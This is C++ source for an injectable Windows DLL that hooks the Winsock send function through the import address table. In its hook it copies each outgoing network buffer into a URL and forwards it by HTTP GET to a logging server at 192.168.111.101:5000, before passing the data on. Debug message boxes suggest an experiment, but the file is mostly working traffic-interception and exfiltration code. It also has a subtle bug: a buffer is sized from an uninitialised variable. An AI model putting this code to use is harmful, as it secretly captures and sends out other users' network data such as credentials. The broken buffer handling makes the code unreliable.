#include <windows.h>
#include <stdlib.h>
#include <string>
#include <winhttp.h>
#include "IAT_hooker.h"
#pragma comment(lib, "winhttp.lib")

OrgSend orgSend;
OrgRecv orgRecv;

int __stdcall hookSendProc(SOCKET s, const char *buf, int len, int flags)
{
    size_t size;
    wstring url;
    vector<WCHAR> wbuf(size);
    HINTERNET hSession, hConnect, hRequest;
    URL_COMPONENTS uc;
    WCHAR szHostName[256], szUrlPath[2048];

    while(true)
    {
        mbstowcs_s(&size, NULL, 0, buf, 0);
        mbstowcs_s(&size, wbuf.data(), wbuf.size(), buf, strlen(buf));

        url = L"http://192.168.111.101/log?";
        url += L"senddata=";
        url += wbuf.data();

        hSession = WinHttpOpen(L"SendRecvHook", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (hSession == NULL)
        {
            MessageBox(NULL, "WinHttpOpen() failed", "", MB_OK);
            break;
        }

        ZeroMemory(&uc, sizeof(URL_COMPONENTS));
        uc.dwStructSize            = sizeof(URL_COMPONENTS);
        uc.lpszHostName            = szHostName;
        uc.dwHostNameLength        = sizeof(szHostName) / sizeof(WCHAR);
        uc.lpszUrlPath            = szUrlPath;
        uc.dwUrlPathLength        = sizeof(szUrlPath) / sizeof(WCHAR);

        if (!WinHttpCrackUrl(url.data(), url.size(), 0, &uc))
        {
            WinHttpCloseHandle(hSession);
            MessageBox(NULL, "WinHttpCrackUrl() failed", "", MB_OK);
            break;
        }

        hConnect = WinHttpConnect(hSession, szHostName, 5000/*INTERNET_DEFAULT_PORT*/, 0);
        if (hConnect == NULL) 
        {
            WinHttpCloseHandle(hSession);
            MessageBox(NULL, "WinHttpConnect() failed", "", MB_OK);
            break;
        }

        hRequest = WinHttpOpenRequest(hConnect, L"GET", szUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        if (hRequest == NULL) 
        {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            MessageBox(NULL, "WinHttpOpenRequest() failed", "", MB_OK);
            break;
        }

        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
        {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            MessageBox(NULL, "WinHttpSendRequest() failed", "", MB_OK);
            break;
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        break;
    }
    MessageBox(NULL, buf, "Send is called", MB_OK);

    return (*orgSend)(s,buf,len,flags);
}

int __stdcall hookRecvProc(SOCKET s, char *buf, int len, int flags)
{
    MessageBox(NULL, buf, "Recv is called", MB_OK);

    return (*orgRecv)(s, buf, len, flags);
}


BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID)
{
    IATHooker srh;

    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL, "DLL injected.", "", MB_OK);
        orgSend = (OrgSend)srh.hookByOrdinal("WS2_32.dll", 19, (DWORD)hookSendProc);
        //orgSend = (OrgSend)srh.hookBySymbol("WS2_32.dll", "send", (DWORD)hookSendProc);  // ※名前(symbol)の情報が入っていないので序数(ordinal)からしか取得できない。
        //orgRecv = (OrgRecv)srh.hookByOrdinal("WS2_32.dll", 16, (DWORD)hookRecvProc);
        break;
    }

    return TRUE;
}
